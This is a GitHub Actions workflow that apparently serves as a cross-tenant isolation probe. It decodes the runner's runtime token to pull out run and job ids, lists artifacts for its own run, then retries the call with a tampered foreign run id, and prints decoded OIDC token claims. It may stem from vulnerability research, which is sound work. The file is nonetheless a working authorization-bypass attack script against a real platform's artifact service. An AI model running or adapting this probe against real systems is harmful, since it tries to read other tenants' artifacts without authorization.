name: xtenant-probe
on: push
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: runtime scope + cross-run artifact probe
        shell: bash
        run: |
          set +e
          echo "## RESULTS_URL=$ACTIONS_RESULTS_URL"
          CLAIMS=$(printf '%s' "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null)
          echo "## RUNTIME scp claim:"
          printf '%s' "$CLAIMS" | python3 -c "import sys,json;d=json.load(sys.stdin);print('scp=',d.get('scp'));print('iss=',d.get('iss'),'aud=',d.get('aud'))" 2>/dev/null
          # extract my run/job backend ids from scp: "Actions.Results:<runId>:<jobId>"
          SCP=$(printf '%s' "$CLAIMS" | python3 -c "import sys,json;print(json.load(sys.stdin).get('scp',''))" 2>/dev/null)
          RUNID=$(printf '%s' "$SCP" | sed -n 's/.*Actions.Results:\([0-9a-f-]*\):.*/\1/p')
          JOBID=$(printf '%s' "$SCP" | sed -n 's/.*Actions.Results:[0-9a-f-]*:\([0-9a-f-]*\).*/\1/p')
          echo "## my runId=$RUNID jobId=$JOBID"
          echo "## legit ListArtifacts (own run):"
          curl -s -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" \
            -d "{\"workflow_run_backend_id\":\"$RUNID\",\"workflow_job_run_backend_id\":\"$JOBID\"}" -w " [%{http_code}]" | head -c 300
          echo
          echo "## TAMPER: ListArtifacts with a DIFFERENT (foreign) run backend id (uuid bumped):"
          FOREIGN=$(printf '%s' "$RUNID" | python3 -c "import sys;s=sys.stdin.read().strip();print(s[:-1]+('0' if s[-1]!='0' else '1'))")
          curl -s -X POST "${ACTIONS_RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" \
            -d "{\"workflow_run_backend_id\":\"$FOREIGN\",\"workflow_job_run_backend_id\":\"$JOBID\"}" -w " [%{http_code}]" | head -c 300
          echo
          echo "## OIDC claims:"
          curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=x" | python3 -c "import sys,json;v=json.load(sys.stdin).get('value','');import base64;p=v.split('.')[1];print(base64.urlsafe_b64decode(p+'==').decode())" 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print({k:d[k] for k in ('sub','aud','repository','repository_owner','run_id') if k in d})" 2>/dev/null